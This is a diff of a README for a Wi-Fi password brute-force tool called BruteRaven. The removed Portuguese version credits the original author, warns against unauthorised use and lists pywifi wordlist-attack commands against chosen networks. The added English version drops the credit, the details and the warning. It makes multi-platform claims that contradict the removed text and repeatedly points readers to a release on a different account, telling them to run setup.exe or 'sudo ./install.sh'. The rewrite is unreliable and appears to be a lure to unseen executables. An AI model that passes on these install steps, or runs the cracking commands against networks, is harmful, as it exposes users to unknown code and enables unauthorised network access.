@@ -1,125 +1,110 @@
-# 🛠️ Wi-Fi Brute Force - BruteRaven
+# Wi-Fi Brute Force Tool - BruteRaven 🦅
 
-Um projeto educacional que demonstra como realizar força bruta em redes Wi-Fi com interface gráfica feita em Tkinter e motor de execução usando `pywifi`.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/NrxFerdaus/bruteraven/releases)
 
-> ⚠️ **Uso estritamente educacional!** Não utilize este software em redes que você não tem permissão para testar. Invadir redes sem autorização é crime.
+## Table of Contents
 
----
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Acknowledgments](#acknowledgments)
 
-## 🎯 Funcionalidades
+## Overview
 
-- Escaneia redes Wi-Fi disponíveis
-- Permite selecionar a rede-alvo pela interface
-- Suporte a várias wordlists:
-  - Top100k (download automático e cache)
-  - RockYou (opcional)
-  - Arquivo local `.txt`
-  - URL remota
-- Interface gráfica com:
-  - Combobox de redes com força do sinal
-  - Opções extras (Verbose, Modo Rápido, Forçar download)
-  - Botão para iniciar o ataque
-- Terminal exibe o progresso detalhado das tentativas
-- Compatível com Windows (recomendado)
+BruteRaven is a powerful Wi-Fi brute force tool designed for educational purposes. This tool helps users understand the principles of brute force attacks in a controlled environment. It allows users to test the security of their own Wi-Fi networks and learn about security vulnerabilities.
 
----
+**Key Topics:**
+- Brute Force
+- Wi-Fi Hacking
+- Security Tools
+- Educational Technology
 
-## 🖥️ Interface Gráfica
+## Features
 
-![Interface gráfica](./assets/preview.png)
+- **User-Friendly Interface:** Simple and intuitive design for easy navigation.
+- **Customizable Settings:** Adjust parameters to suit different testing scenarios.
+- **Detailed Logs:** View detailed logs of attempts and results for better analysis.
+- **Multi-Platform Support:** Compatible with Windows, macOS, and Linux.
+- **Educational Resources:** Access guides and tutorials to enhance learning.
 
----
+## Installation
 
-## 🧩 Estrutura
+To install BruteRaven, follow these steps:
+
+1. Download the latest release from the [Releases](https://github.com/NrxFerdaus/bruteraven/releases) section.
+2. Extract the downloaded file.
+3. Navigate to the extracted folder.
+4. Run the installation script based on your operating system.
+
+### Windows Installation
+
+1. Double-click the `setup.exe` file.
+2. Follow the on-screen instructions to complete the installation.
+
+### macOS Installation
+
+1. Open Terminal.
+2. Navigate to the folder containing the extracted files.
+3. Run the command:
+   ```bash
+   sudo ./install.sh
+   ```
+
+### Linux Installation
+
+1. Open Terminal.
+2. Navigate to the folder containing the extracted files.
+3. Run the command:
+   ```bash
+   chmod +x install.sh
+   sudo ./install.sh
+   ```
+
+## Usage
+
+To use BruteRaven effectively, follow these steps:
+
+1. Launch the application.
+2. Select the Wi-Fi network you want to test.
+3. Configure the attack settings:
+   - Choose the attack type (e.g., dictionary, pure brute force).
+   - Set the password length and character set.
+4. Start the attack and monitor the progress through the logs.
+
+### Example Command Line Usage
+
+For advanced users, BruteRaven can also be used via the command line. Here’s an example command:
 
 ```bash
-wifi_brute_force/
-├── main.py           # Script principal de ataque
-├── ui_launcher.py    # Interface gráfica em Tkinter
-├── wordlists/        # Wordlists armazenadas em cache
-└── README.md
-````
-
----
-
-## ⚙️ Como usar
-
-### 🔹 Instale as dependências
-
-```bash
-pip install pywifi
+bruteraven --target <SSID> --attack-type <type> --password-length <length>
 ```
 
-> 💡 Recomendado: usar Python 3.9+ no Windows com permissões elevadas
+Replace `<SSID>`, `<type>`, and `<length>` with your desired values.
 
-### 🔹 Rodar pela interface
+## Contributing
 
-```bash
-python ui_launcher.py
-```
+We welcome contributions to improve BruteRaven. If you have ideas or suggestions, please follow these steps:
 
-A interface irá:
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your forked repository.
+5. Open a pull request to the main repository.
 
-* Escanear redes disponíveis
-* Permitir a seleção da rede-alvo
-* Oferecer modos de wordlist e configurações extras
+### Code of Conduct
 
-### 🔹 Rodar via terminal
+Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) when contributing.
 
-```bash
-# Usar Top100k (cache automático):
-python main.py -w top100k
+## License
 
-# Usar RockYou (mais pesada):
-python main.py -w rockyou
+BruteRaven is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-# Usar arquivo local:
-python main.py -f minha_lista.txt
+## Acknowledgments
 
-# Usar URL direta:
-python main.py -u https://exemplo.com/lista.txt
+- Thanks to the open-source community for their contributions.
+- Special thanks to the developers of the libraries used in this project.
 
-# Ativando verbose + modo rápido:
-python main.py -w top100k -v --quick
-
-# Forçar download de wordlist novamente:
-python main.py -w top100k --force-download
-
-# Atacar uma rede específica:
-python main.py -w top100k --ssid "NOME_DA_REDE"
-```
-
----
-
-## 📌 Requisitos
-
-* Windows com adaptador Wi-Fi funcional
-* Python 3.8+
-* Permissões de administrador (recomendado)
-
----
-
-## 🧠 Observações
-
-* O script **não quebra WPA2 com brute puro**, apenas tenta autenticar usando senhas comuns da wordlist
-* O `pywifi` apenas testa conexões; **não captura handshake**
-* Apenas redes visíveis podem ser atacadas
-
----
-
-## 🧑‍💻 Autor
-
-Desenvolvido por **Eduardo dos Santos Ferreira**
-
-GitHub: [github.com/EduardoDosSantosFerreira](https://github.com/EduardoDosSantosFerreira)
-
----
-
-## ⚠️ Aviso Legal
-
-Este projeto é fornecido **apenas para fins educacionais e testes em ambientes controlados**.
-**Não me responsabilizo por qualquer uso indevido.**
-
-```
-
----
+For more information, visit the [Releases](https://github.com/NrxFerdaus/bruteraven/releases) section.
